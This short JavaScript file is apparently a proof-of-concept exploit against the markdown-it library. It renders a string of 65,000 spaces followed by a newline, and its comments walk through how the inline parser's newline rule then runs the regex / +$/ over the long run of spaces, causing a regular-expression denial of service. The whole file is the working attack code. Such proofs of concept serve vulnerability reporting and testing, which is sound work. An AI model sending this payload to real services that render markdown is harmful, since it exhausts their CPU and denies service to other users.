const MarkdownIt = require('markdown-it');

async function exploit() {
  const md = new MarkdownIt();

  // Construct input that forces markdown-it's inline parser to accumulate
  // >30,000 spaces in the `state.pending` buffer before encountering a newline.
  const payload = ' '.repeat(65000) + '\n';

  // When md.render() processes this string:
  // 1. The inline parser accumulates all leading spaces into state.pending.
  // 2. Upon hitting '\n', the `newline` rule is invoked.
  // 3. Since pending has ≥2 trailing spaces (pmax >= 1 && pending[pmax-1] === 0x20),
  //    it executes: state.pending = state.pending.replace(/ +$/, '');
  // 4. This triggers the vulnerable regex against a massive homogeneous string.

  md.render(payload);
}

await exploit();
